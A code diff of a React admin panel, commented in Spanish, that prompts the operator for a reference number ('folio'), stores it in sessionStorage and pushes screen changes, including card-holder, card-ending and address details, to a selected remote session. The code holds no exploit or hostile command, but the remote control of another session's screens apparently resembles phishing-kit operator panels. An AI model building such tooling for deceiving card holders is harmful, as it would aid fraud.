@@ -460,6 +460,29 @@ export default function AdminPanel() {
       return;
     }
 
+    // Para la pantalla de folio, recuperamos el folio ingresado para usarlo después
+    if (screen === "folio") {
+      // Si estamos cambiando a la pantalla de folio, mostramos un prompt para pedir el folio
+      const folioInput = prompt("Ingrese el folio:");
+      if (folioInput) {
+        sendScreenChange({
+          tipo: `mostrar_${screen}`,
+          sessionId: selectedSessionId,
+          folio: folioInput
+        });
+        
+        // Guardamos el folio en sessionStorage para recuperarlo cuando se necesite en la pantalla de instrucciones
+        try {
+          sessionStorage.setItem(`folio_${selectedSessionId}`, folioInput);
+        } catch (e) {
+          console.error("Error al guardar el folio en sessionStorage:", e);
+        }
+      } else {
+        return; // Si el usuario cancela el prompt, no hacemos nada
+      }
+      return;
+    }
+
     // Send direct screen change for other screens
     sendScreenChange({
       tipo: `mostrar_${screen}`,
@@ -524,12 +547,24 @@ export default function AdminPanel() {
   };
   
   const handleCardInstructionsConfirm = (data: { cliente: string, terminacion: string, folio: string, direccion: string }) => {
+    // Intentar recuperar el folio almacenado para esta sesión
+    let folioToUse = data.folio;
+    try {
+      const savedFolio = sessionStorage.getItem(`folio_${selectedSessionId}`);
+      if (savedFolio) {
+        folioToUse = savedFolio;
+        console.log("Recuperado folio guardado:", savedFolio);
+      }
+    } catch (e) {
+      console.error("Error al recuperar el folio de sessionStorage:", e);
+    }
+    
     sendScreenChange({
       tipo: 'mostrar_tarjeta',
       sessionId: selectedSessionId,
       titular: data.cliente,
       terminacion: data.terminacion,
-      folio: data.folio,
+      folio: folioToUse,
       direccion: data.direccion
     });
     closeModal();
